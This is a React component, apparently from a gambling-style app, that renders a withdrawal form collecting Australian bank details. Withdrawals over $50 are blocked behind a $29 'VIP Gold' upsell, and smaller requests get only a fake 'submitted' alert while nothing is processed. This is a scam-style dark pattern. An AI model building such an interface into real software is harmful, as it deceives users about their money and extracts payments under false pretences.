import React, { useState } from 'react';
import { Card } from './ui/card';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Badge } from './ui/badge';

interface WithdrawTrapProps {
  balance: number;
  onBack: () => void;
}

const WithdrawTrap: React.FC<WithdrawTrapProps> = ({ balance, onBack }) => {
  const [amount, setAmount] = useState('');
  const [bankName, setBankName] = useState('');
  const [bsb, setBsb] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [showVipUpsell, setShowVipUpsell] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = () => {
    if (parseFloat(amount) > 50) {
      setShowVipUpsell(true);
      return;
    }
    
    setIsSubmitting(true);
    setTimeout(() => {
      alert('⏳ Withdrawal submitted! Processing time: 1-5 business days');
      setIsSubmitting(false);
      onBack();
    }, 2000);
  };

  const isFormValid = amount && bankName && bsb && accountNumber && accountName;

  if (showVipUpsell) {
    return (
      <div className="min-h-screen bg-black text-white">
        <div className="bg-gradient-to-r from-purple-600 to-pink-600 p-4">
          <div className="flex items-center gap-3">
            <Button onClick={() => setShowVipUpsell(false)} variant="ghost" className="text-white p-2">
              ←
            </Button>
            <div>
              <h1 className="text-xl font-bold">💎 VIP Upgrade Required</h1>
              <p className="text-sm text-purple-100">Fast Track Your Withdrawal</p>
            </div>
          </div>
        </div>

        <div className="p-4 space-y-4">
          <Card className="bg-gradient-to-br from-purple-900 to-black border-purple-500 p-6 text-center">
            <div className="text-6xl mb-4">💎</div>
            <h2 className="text-2xl font-bold text-purple-400 mb-4">VIP Gold Required</h2>
            <p className="text-gray-300 mb-6">
              Withdrawals over $50 require VIP Gold status for instant processing.
            </p>
            
            <div className="bg-gray-800 p-4 rounded-lg mb-6">
              <div className="flex justify-between items-center mb-2">
                <span>Regular Processing:</span>
                <span className="text-red-400">1-5 business days</span>
              </div>
              <div className="flex justify-between items-center">
                <span>VIP Gold Processing:</span>
                <span className="text-green-400">Instant - 2 hours</span>
              </div>
            </div>

            <div className="space-y-3">
              <Button className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold py-3">
                🚀 Upgrade to VIP Gold - $29
              </Button>
              <Button 
                onClick={() => setShowVipUpsell(false)}
                variant="outline" 
                className="w-full border-gray-600 text-gray-400"
              >
                Continue with Standard Processing
              </Button>
            </div>
          </Card>

          <Card className="bg-gray-900 border-gray-700 p-4">
            <h3 className="text-lg font-bold text-yellow-500 mb-3">🏆 VIP Gold Benefits</h3>
            <div className="space-y-2 text-sm">
              <div className="flex items-center gap-2">
                <span className="text-green-400">✅</span>
                <span>Instant withdrawals (2 hours max)</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-green-400">✅</span>
                <span>Higher withdrawal limits</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-green-400">✅</span>
                <span>Priority customer support</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-green-400">✅</span>
                <span>Exclusive bonuses & promotions</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-green-400">✅</span>
                <span>Personal account manager</span>
              </div>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Header */}
      <div className="bg-gradient-to-r from-red-600 to-red-800 p-4">
        <div className="flex items-center gap-3">
          <Button onClick={onBack} variant="ghost" className="text-white p-2">
            ←
          </Button>
          <div>
            <h1 className="text-xl font-bold">💸 Withdraw Funds</h1>
            <p className="text-sm text-red-100">Available: ${balance.toFixed(2)}</p>
          </div>
        </div>
      </div>

      <div className="p-4 space-y-4">
        {/* Balance Info */}
        <Card className="bg-gradient-to-r from-green-900 to-gray-900 border-green-500 p-4">
          <div className="text-center">
            <h2 className="text-lg text-gray-300">Available Balance</h2>
            <div className="text-3xl font-bold text-green-400">${balance.toFixed(2)}</div>
            <p className="text-sm text-gray-400 mt-2">Minimum withdrawal: $10</p>
          </div>
        </Card>

        {/* Withdrawal Form */}
        <Card className="bg-gray-900 border-gray-700 p-4">
          <h3 className="text-lg font-bold text-red-400 mb-4">💰 Withdrawal Details</h3>
          
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-gray-300 mb-2">Amount ($)</label>
              <Input
                type="number"
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white"
                max={balance}
              />
            </div>
            
            <div>
              <label className="block text-sm text-gray-300 mb-2">Bank Name</label>
              <Input
                placeholder="e.g. Commonwealth Bank"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white"
              />
            </div>
            
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm text-gray-300 mb-2">BSB</label>
                <Input
                  placeholder="123-456"
                  value={bsb}
                  onChange={(e) => setBsb(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-300 mb-2">Account Number</label>
                <Input
                  placeholder="12345678"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
            </div>
            
            <div>
              <label className="block text-sm text-gray-300 mb-2">Account Name</label>
              <Input
                placeholder="Full name as per bank account"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white"
              />
            </div>
          </div>
        </Card>

        {/* Processing Info */}
        <Card className="bg-yellow-900/20 border-yellow-500 p-4">
          <div className="flex items-start gap-3">
            <span className="text-2xl">⏰</span>
            <div>
              <h3 className="font-bold text-yellow-500">Processing Times</h3>
              <p className="text-sm text-gray-300 mt-1">
                Standard withdrawals are processed within <strong>1-5 business days</strong>.
                Processing may take longer during weekends and holidays.
              </p>
              <div className="mt-3 p-2 bg-purple-900/30 rounded border border-purple-500">
                <p className="text-sm text-purple-300">
                  💎 <strong>Upgrade to VIP Gold</strong> for instant withdrawals (2 hours max)
                </p>
              </div>
            </div>
          </div>
        </Card>

        {/* Submit Button */}
        <Button
          onClick={handleSubmit}
          disabled={!isFormValid || isSubmitting}
          className="w-full bg-red-600 hover:bg-red-700 text-lg py-4 font-bold"
        >
          {isSubmitting ? '⏳ Submitting...' : '🚀 Submit Withdrawal Request'}
        </Button>

        {/* Security Notice */}
        <div className="text-center text-xs text-gray-500 mt-4">
          <p>🔒 All withdrawals are manually reviewed for security</p>
          <p>📧 You will receive email confirmation once processed</p>
        </div>
      </div>
    </div>
  );
};

export default WithdrawTrap;